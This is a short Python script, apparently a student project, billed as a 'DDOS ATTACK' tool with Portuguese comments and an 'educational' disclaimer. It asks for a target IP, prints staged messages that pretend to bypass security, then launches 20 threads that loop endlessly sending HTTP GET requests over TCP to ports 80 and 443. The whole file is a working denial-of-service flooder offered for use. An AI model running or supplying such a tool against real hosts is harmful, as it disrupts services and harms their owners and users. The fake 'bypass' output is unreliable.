import subprocess
import time
import socket
import random
import threading

print("\033[92m")

# Interface
subprocess.run(["clear"])
subprocess.run(["figlet", "DDOS ATTACK"])

print()
print("Author   : Robson Junior")
print("Github   : github.com/robsujunior")
print("Note: Ferramenta para fins educacionais!")
print()

ip = input("IP Target : ")

subprocess.run(["clear"])
subprocess.run(["figlet", "Trabalho SASI"])

print("Team : Robson e Marcus")
print("\033[92m")

print("________________TENTANDO ACESSAR O SERVIDOR__________________")
time.sleep(3)
print("___________________ESTABELECENDO CONEXÃO_____________________")
time.sleep(3)
print("______________IGNORANDO A CAMADA DE SEGURANÇA________________")
time.sleep(3)
print("___________________CONEXÃO ESTABELECIDA______________________")
time.sleep(3)
print("ATAQUE DDOS INICIADO(educacional)")
time.sleep(3)


def testar_conexao_tcp(host, porta, timeout=5):
        
    try:
        # Cria o socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

       # 2. Estabelece a Conexão (Handshake)
        sock.connect((host, porta))
  

        # 3. Envia um pacote de dados (Payload)
        # Se for porta 80, enviamos um cabeçalho HTTP básico
        payload = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
        while True:
            sock.sendall(payload.encode())
            resposta = sock.recv(1024)
            if resposta:
                print(f"[Resposta recebida ({len(resposta)} bytes)")

          
    except Exception as e:
        print(f"[EXCEÇÃO] Erro ao conectar: {e}")
        return False

    finally:
        sock.close()


threads = []

# Criando várias threads
for i in range(10):  # Exemplo: criando 100 threads
    th = threading.Thread(target=testar_conexao_tcp, args=(ip, 443)) # Exemplo: testando porta 443
    t = threading.Thread(target=testar_conexao_tcp, args=(ip, 80))  # Exemplo: testando porta 80
    threads.append(t)
    threads.append(th)
    t.start()  
    th.start()

# Esperar todas terminarem
for t in threads:
    t.join()

print("Todas as threads finalizaram")

